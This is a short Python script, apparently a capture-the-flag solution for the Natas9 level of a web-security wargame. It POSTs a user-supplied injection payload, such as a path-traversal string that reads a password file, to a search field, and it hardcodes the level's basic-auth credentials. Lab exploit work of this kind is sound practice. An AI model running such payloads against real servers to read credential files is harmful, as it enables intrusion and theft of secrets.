#!/bin/python3

import argparse
import pyfiglet
import requests
import sys

script_name = pyfiglet.figlet_format('Natas9 LFI')
print(script_name)

parser = argparse.ArgumentParser(add_help=True, description = 'Attempts to exploit LFI on the target URL')
parser.add_argument('-v','--verbose', action='store', help='Verbose mode')
parser.add_argument('-u','--url', action='store', help='URL to target', required=True)
parser.add_argument('-p', '--payload', action='store', help='LFI payload e.g. ../../../../etc/natas_webpass', required=True)
parser.add_argument('-c', '--cookies', action='store', help='For setting cookies if necessary e.g. {\'security\':\'low\', \'PHPSESSID\':\'<value>\'}')
args = parser.parse_args()

try:
	print('[*] Testing URL...')
	payload = {'needle':f'{args.payload}', 'submit': 'Search'} 
	r = requests.post(f'{args.url}', data=payload , auth=('natas9', 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'))
	print(r.text)
	print('[+] Contents of URL...') 
		
except requests.exceptions.RequestException as er:
	print(f'Response returned: {er}')
	print(f'Exiting {sys.argv[0]}')
	sys.exit(1)
